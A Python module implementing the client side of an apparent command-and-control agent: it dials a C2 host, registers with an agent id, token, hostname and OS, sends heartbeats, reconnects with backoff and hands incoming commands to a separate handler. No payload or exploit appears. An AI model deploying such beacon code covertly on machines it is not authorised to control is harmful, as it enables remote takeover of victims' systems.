"""TCP client connecting remote Agent to C2.

Handles:

- Async TCP dial to ``c2_address`` with exponential-backoff reconnect.
- Sends ``register`` packet after TCP connect.
- Periodic ``heartbeat`` packets to keep the connection alive.
- Reads incoming packets and feeds them to a Handler.
"""

import asyncio
import logging
import platform
import socket
from typing import Callable, Optional

from common.protocol import (
    CMD_HEARTBEAT,
    CMD_REGISTER,
    PacketReader,
    encode_control,
)


logger = logging.getLogger(__name__)


class AgentClient:
    def __init__(
        self,
        c2_host: str,
        c2_port: int,
        agent_id: str,
        auth_token: str,
        heartbeat_interval: int = 30,
        reconnect_initial: float = 1.0,
        reconnect_max: float = 60.0,
    ) -> None:
        self._c2_host = c2_host
        self._c2_port = c2_port
        self._agent_id = agent_id
        self._auth_token = auth_token
        self._heartbeat_interval = heartbeat_interval
        self._reconnect_initial = reconnect_initial
        self._reconnect_max = reconnect_max
        self._reader = PacketReader()
        self._connected = False
        self._on_packet: Optional[Callable] = None
        self._writer: Optional[asyncio.StreamWriter] = None
        self._write_lock = asyncio.Lock()
        self._hb_task: Optional[asyncio.Task] = None
        self._stopped = False
        self._next_request_id = 1

    @property
    def write_lock(self) -> asyncio.Lock:
        return self._write_lock

    def set_packet_handler(self, handler) -> None:
        self._on_packet = handler
        if handler is not None and hasattr(handler, '_write_lock'):
            handler._write_lock = self._write_lock

    @property
    def connected(self) -> bool:
        return self._connected

    def next_request_id(self) -> int:
        rid = self._next_request_id
        self._next_request_id += 1
        return rid

    async def run(self) -> None:
        delay = self._reconnect_initial
        while not self._stopped:
            try:
                await self._connect_and_serve()
            except asyncio.CancelledError:
                raise
            except Exception as e:
                logger.warning(f"connection error: {e}")
            self._connected = False
            if self._stopped:
                return
            try:
                await asyncio.sleep(delay)
            except asyncio.CancelledError:
                return
            delay = min(delay * 2, self._reconnect_max)

    def request_shutdown(self) -> None:
        """Called by Handler on CMD_SHUTDOWN: stop reconnect loop and exit."""
        self._stopped = True

    async def stop(self) -> None:
        self._stopped = True
        if self._hb_task is not None:
            self._hb_task.cancel()
            try:
                await self._hb_task
            except (asyncio.CancelledError, Exception):
                pass
        if self._writer is not None:
            self._writer.close()

    async def _connect_and_serve(self) -> None:
        reader, writer = await asyncio.open_connection(self._c2_host, self._c2_port)
        self._writer = writer
        self._reader = PacketReader()
        if self._on_packet is not None and hasattr(self._on_packet, "reset"):
            self._on_packet.reset()
        await self._send_register(writer)
        self._connected = True
        logger.info(f"connected to C2 at {self._c2_host}:{self._c2_port}")

        self._hb_task = asyncio.create_task(self._heartbeat_loop(writer))

        try:
            while not self._stopped:
                chunk = await reader.read(4096)
                if not chunk:
                    raise ConnectionError("C2 closed connection")
                if self._on_packet is None:
                    continue
                self._on_packet.feed(chunk)
                await self._on_packet.process(reader, writer)
        finally:
            self._connected = False
            if self._hb_task is not None:
                self._hb_task.cancel()
                try:
                    await self._hb_task
                except Exception:
                    pass
                self._hb_task = None
            writer.close()
            self._writer = None

    async def _send_register(self, writer: asyncio.StreamWriter) -> None:
        req_id = self.next_request_id()
        hostname = socket.gethostname()
        os_name = _detect_os()
        pkt = encode_control(req_id, CMD_REGISTER, [self._agent_id, self._auth_token, hostname, os_name])
        async with self._write_lock:
            writer.write(pkt)
            await writer.drain()

    async def _heartbeat_loop(self, writer: asyncio.StreamWriter) -> None:
        try:
            while True:
                await asyncio.sleep(self._heartbeat_interval)
                req_id = self.next_request_id()
                pkt = encode_control(req_id, CMD_HEARTBEAT, [str(_now())])
                async with self._write_lock:
                    writer.write(pkt)
                    await writer.drain()
        except asyncio.CancelledError:
            return
        except Exception as e:
            logger.warning(f"heartbeat error: {e}")


def _detect_os() -> str:
    s = platform.system().lower()
    if s == "windows":
        return "Windows"
    if s == "linux":
        return "Linux"
    if s == "darwin":
        return "macOS"
    return s


def _now() -> int:
    import time
    return int(time.time())